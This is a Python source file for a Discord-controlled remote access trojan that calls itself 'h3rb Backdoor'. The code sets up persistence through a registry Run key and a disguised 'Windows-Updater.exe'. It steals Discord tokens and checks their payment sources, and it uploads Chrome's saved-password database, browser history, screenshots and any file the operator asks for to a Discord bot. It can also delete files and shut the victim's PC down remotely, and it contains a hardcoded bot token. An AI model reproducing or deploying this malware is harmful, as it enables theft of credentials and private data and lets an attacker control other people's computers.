import re, sys
import os
import requests
import subprocess as sp
import json
import shutil
import discord
import webbrowser
import ctypes
from ctypes import cast,POINTER
import browserhistory
import random
import pyautogui
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from base64 import b64decode
from json import loads
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
# from colorful import *
import shutil
import platform as plt

ids = []
OS = plt.platform().split("-")
name = os.getenv("UserName")
Username = os.getenv("COMPUTERNAME")
dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
# shutil.copy("backdoor.py", fr"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

BotToken = "MTAyOTExMDA0NTQwMjc0NjkzMQ.Guip05.OsRH6oOBs357LTVayIZl3MmOUO7d3mm_sO_QJE"
prefix = '.'
client = commands.Bot(intents=discord.Intents.all(), command_prefix=prefix)
client.remove_command("help")


def GetIP():
    return requests.get("https://api.ipify.org/").text

def GetName():
    return os.getenv("COMPUTERNAME")

def autoPersistent():
    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
    if not os.path.exists(backdoor_location):
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)

def survivalmode():
    if GetIP() == '79.116.41.190':
        pass
    else:
        autoPersistent()
    if GetName() == 'DESKTOP-E5RJB6V':
        pass
    else:
        autoPersistent()
survivalmode()


def WinMsg(Name, Value):
    embed = discord.Embed(title="⚠ Information", color=0x3498DB)
    embed.add_field(name=f"{Name}", value=f"{Value}")
    embed.set_footer(text="h3rb Backdoor・Tito Delas")
    return embed


def ErrorMsg():
    embed = discord.Embed(title="❌ Information", color=0x3498DB)
    embed.add_field(name="Error", value=f"Error IP :(")
    embed.set_footer(text="h3rb Backdoor・Tito Delas")
    return embed

def Hwid():
    p = Popen("wmic csproduct get uuid", shell=True,
            stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def Payment(token):
    try:
        return loads(urlopen(Request("https://discord.com/api/v8/users/@me/billing/payment-sources", headers={"authorization": token, "content-type": "application/json"}).read().decode()))
    except:
        pass


def Tokens(path):
    tokens = []

    for file in os.listdir(path):
        if not file.endswith(".log") and not file.endswith(".ldb"):
            continue
        for l in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
            for mst in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(mst, l):
                    tokens.append(token)
    return tokens

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"why and how I hack you device"))

@client.command()
async def volumemax(ctx, NAME):
    if NAME == GetName():
        volumeup()
        await ctx.send(embed=WinMsg("MessageBox", f"[*] Volume of `{NAME}` set to `100%`  "))

@client.command()
async def volumezero(ctx, NAME):
    if NAME == GetName():
        volumedown()
        await ctx.send(embed=WinMsg("MessageBox", f"[*] Volume of `{NAME}` set to `0%`  "))

@client.command()
async def tokens(ctx, NAME):
    if NAME == GetName():
        for platform, path in dire.items():
            for token in Tokens(path):
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in ids:
                        continue
                ids.append(uid)
            messages3 = f"```ARM\nTokens: {token}\n```"
            await ctx.send(messages3)


@client.command()
async def payment(ctx, NAME):
    if NAME == GetName():
        for platform, path in dire.items():
            for token in Tokens(path):
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in ids:
                        continue
                ids.append(uid)
                payment = bool(Payment(token))

                messages2 = f"```ARM\nTokens: {token}\nPayment Method: {payment}\n```"
        await ctx.send(messages2)
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def check(ctx):
    OS = plt.platform().split("-")
    name = os.getenv("UserName")
    Username = os.getenv("COMPUTERNAME")
    messages1 = f"```ARM\nIP: {GetIP()}\n```" + f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + \
        f"```ARM\nPC Name: {name}\n```" + \
        f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"
    embed = discord.Embed(title=f"{Username}", description=f'`Victim {Username} || {name}`', color=0x3498DB)
    embed.set_thumbnail(url='https://cdn.icon-icons.com/icons2/2072/PNG/512/data_hosting_information_internet_security_server_storage_icon_127051.png')
    embed.add_field(name=f'Victim {Username}', value=f'{messages1}')
    await ctx.send(embed=embed)
    # await ctx.send(messages1)

@client.command()
async def test(ctx, NAME, *msg):
    if NAME == GetName():
        ctypes.windll.user32.MessageBoxW(0, " ".join(msg), "", 1)
        await ctx.send(embed=WinMsg("MessageBox", f"[*] Message sent successfully `" + " ".join(msg) + "`"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def getpass(ctx, NAME):
    if NAME == GetName():
        await ctx.send(file=discord.File(f"C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def run(ctx, NAME, url):
    if NAME == GetName():
        webbrowser.open(url)
        await ctx.send(embed=WinMsg("Open url", f"[*] Url open successfully `{url}`"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def message(ctx, NAME, *msg):
    if NAME == GetName():
        ctypes.windll.user32.MessageBoxW(0, " ".join(msg), "", 1)
        await ctx.send(embed=WinMsg("MessageBox", f"[*] Message sent successfully `" + " ".join(msg) + "`"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def admin(ctx, NAME):
    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if NAME == GetName():
        if admin == True:
            await ctx.send(embed=WinMsg("Admin check", "[*] The bot is admin"))
        elif admin == False:
            await ctx.send(embed=WinMsg("Admin check", "[*] The bot is not admin"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def shutdown(ctx, NAME):
    if NAME == GetName():
        os.system("shutdown /s /t 1")
        await ctx.send(embed=WinMsg("Shutdown", "[*] Shutdowning successfully"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def cwd(ctx, NAME):
    if NAME == GetName():
        get = os.getcwd()
        cwd = str(get)
        await ctx.send(embed=WinMsg("View cwd", f"`{cwd}`"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def look(ctx, NAME, dir):
    if NAME == GetName():
        dir = os.listdir(dir)
        await ctx.send(embed=WinMsg("Look directory", f"{dir}"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def remove(ctx, NAME, file):
    if NAME == GetName():
        os.remove(file)
        await ctx.send(embed=WinMsg("Remove file", f"{file}"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def read(ctx, NAME, file):
    if NAME == GetName():
        files = open(file, "r").read()
        await ctx.send(f"```\n{files}\n```")
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def ss(ctx, NAME):
    if NAME == GetName():
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f'C:\\Users\\{name}\\screenshot1.png')
        await ctx.send(f"Screenshot was save to: ('C:\\Users\\{name}\\screenshot1.png')")
        await ctx.send(file=discord.File(f"C:\\Users\\{name}\\screenshot1.png"))
    else:
        await ctx.send(embed=ErrorMsg())


@client.command()
async def download(ctx, NAME, path):
    if NAME == GetName():
        await ctx.send(file=discord.File(f"{path}"))

@client.command()
async def history(ctx, NAME):
    if NAME == GetName():
        import os
        import browserhistory as bh
        dict_obj = bh.get_browserhistory()
        strobj = str(dict_obj).encode(errors='ignore')
        with open("history.txt","a") as hist:
            hist.write(str(strobj))
        file = discord.File("history.txt", filename="history.txt")
        await ctx.send(file=file)
        os.remove("history.txt")

@client.command()
async def persist(ctx, NAME):
    if NAME == GetName():
        if GetIP() == '79.116.41.190':
            await ctx.send(embed=WinMsg("‼ ERROR ‼", "Try not to hack you my lord 👑"))
        else:
            autoPersistent()

@client.command()
async def help(ctx):
    em = discord.Embed(title='✅ Check your DM', color=0x3498DB)
    await ctx.send(embed=em)

    embed1 = discord.Embed(title="Availability Menu (Working Commands)", description='`🟢| Works 100%`', color=0x3498DB)
    embed1.set_thumbnail(url='https://cdn.icon-icons.com/icons2/2072/PNG/512/check_document_file_internet_report_security_success_icon_127056.png')
    embed1.add_field(name=f"🟢 | {prefix}message <NAME> <message>", value="`Sent a message box`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}run <NAME> <url>",value="`open the webbrowser`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}admin <NAME>",value="`Check if the pc is admin`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}cwd <NAME>",value="`Check the file rat directory`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}check", value="`check your vitim information`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}ss <NAME>", value="`sends screenshoot`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}remove <NAME> <file>", value="`Remove the file`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}shutdown <NAME>", value="`Shutdown the pc`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}history <NAME>", value="`Download Web History`", inline=False)
    embed1.add_field(name=f"🟢 | {prefix}persist <NAME>", value="`When the PC start, the malware do it too (Default this is automatic)`", inline=False)
    embed1.add_field(name=f'🟢 | {prefix}getpass <NAME>', value='`Get RAW chrome passwords`')
    embed2 = discord.Embed(title="Availability Menu (Commands With Problems)", description='`🟡| Works 50%`', color=0x3498DB)
    embed2.set_thumbnail(url='https://cdn.icon-icons.com/icons2/2072/PNG/512/bug_danger_data_internet_malware_security_virus_icon_127084.png')
    embed2.add_field(name=f"🟡 | {prefix}look <NAME> <directory>", value="`Watch directory content`", inline=False)
    embed2.add_field(name=f"🟡 | {prefix}download <NAME> <directory>", value="`download a directory or a file`", inline=False)
    embed3 = discord.Embed(title="Availability Menu (No work commands)", description='`🔴| Works 0%`', color=0x3498DB)
    embed3.set_thumbnail(url='https://cdn.icon-icons.com/icons2/2072/PNG/512/alarm_alert_internet_light_security_siren_warning_icon_127093.png')
    embed3.add_field(name=f"🔴 | {prefix}read <NAME> <directory>",value="`Read the content of the file`", inline=False)
    embed3.add_field(name=f"🔴 | {prefix}tokens <NAME>", value="`Get Disord Token`", inline=False)
    embed3.add_field(name=f"🔴 | {prefix}payment <NAME>", value="`Look discord payment method`", inline=False)
    embed3.add_field(name=f"🔴 | {prefix}volumemax <NAME>", value="`Set PC volume to 100%`", inline=False)
    embed3.add_field(name=f"🔴 | {prefix}volumezero <NAME>", value="`Set PC volume to 0%`", inline=False)
    embed3.set_footer(text="h3rb Backdoor・Tito Delas")
    await ctx.author.send(embed=embed1)
    await ctx.author.send(embed=embed2)
    await ctx.author.send(embed=embed3)

client.run(BotToken)
